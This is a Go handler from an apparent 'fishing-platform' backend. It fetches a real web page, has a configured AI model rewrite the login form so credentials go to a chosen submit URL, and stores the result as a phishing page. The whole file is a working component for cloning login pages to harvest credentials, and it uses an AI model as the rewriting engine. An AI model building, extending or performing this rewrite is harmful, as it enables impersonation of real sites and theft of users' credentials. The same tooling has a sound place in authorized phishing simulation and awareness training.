package handlers

import (
	"context"
	"net/http"
	"strings"
	"time"

	"fishing-platform-backend/config"
	"fishing-platform-backend/models"
	"fishing-platform-backend/utils"
	"github.com/gin-gonic/gin"
)

type mirrorPageRequest struct {
	URL         string `json:"url" binding:"required"`
	Name        string `json:"name"`
	Description string `json:"description"`
	SubmitURL   string `json:"submit_url"`
	RedirectURL string `json:"redirect_url"`
}

// MirrorPhishingPage fetches a URL, rewrites login submit via AI, and saves a phishing page.
func MirrorPhishingPage(c *gin.Context) {
	user, ok := currentUserOrAbort(c)
	if !ok {
		return
	}

	var req mirrorPageRequest
	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "url is required"})
		return
	}

	profile, apiKey, active := ActiveAIConfig()
	if !active {
		c.JSON(http.StatusBadRequest, gin.H{"error": "No AI model is enabled. Configure one in System → AI Settings"})
		return
	}
	if strings.TrimSpace(apiKey) == "" {
		c.JSON(http.StatusBadRequest, gin.H{"error": "Enabled AI profile has no API key"})
		return
	}

	submitURL := strings.TrimSpace(req.SubmitURL)
	if submitURL == "" {
		submitURL = utils.DefaultMirrorSubmitURL
	}
	redirectURL := strings.TrimSpace(req.RedirectURL)

	timeout := time.Duration(profile.TimeoutSec) * time.Second
	if timeout <= 0 {
		timeout = 120 * time.Second
	}
	ctx, cancel := context.WithTimeout(c.Request.Context(), timeout+45*time.Second)
	defer cancel()

	rawHTML, finalURL, err := utils.FetchURLHTML(ctx, req.URL, 30*time.Second)
	if err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "Failed to fetch page: " + err.Error()})
		return
	}

	originalHost := ""
	if finalURL != nil {
		originalHost = finalURL.Host
	}
	aiHTML := utils.StripHeavyBase64DataURIs(rawHTML)

	rewritten, err := utils.RewriteHTMLWithAI(ctx, profile.BaseURL, apiKey, profile.Model, timeout, utils.MirrorRewriteInput{
		RawHTML:      aiHTML,
		SubmitURL:    submitURL,
		RedirectURL:  redirectURL,
		OriginalHost: originalHost,
	})
	if err != nil {
		c.JSON(http.StatusBadGateway, gin.H{"error": "AI rewrite failed: " + err.Error()})
		return
	}
	if err := utils.ValidateRewrittenHTML(rewritten, submitURL); err != nil {
		c.JSON(http.StatusBadGateway, gin.H{"error": "AI rewrite failed validation: " + err.Error()})
		return
	}

	name := strings.TrimSpace(req.Name)
	if name == "" {
		if finalURL != nil && finalURL.Host != "" {
			name = finalURL.Host
		} else {
			name = "Mirrored page"
		}
	}
	pageURL := strings.TrimSpace(req.URL)
	if finalURL != nil {
		pageURL = finalURL.String()
	}
	desc := strings.TrimSpace(req.Description)
	if desc == "" {
		desc = "Mirrored from " + pageURL
	}

	page := models.PhishingPage{
		Name:        name,
		URL:         pageURL,
		Description: desc,
		Html:        rewritten,
		CreatedBy:   user.ID,
	}
	db := config.GetDB()
	if err := db.Create(&page).Error; err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to save mirrored page"})
		return
	}

	c.JSON(http.StatusCreated, page)
}
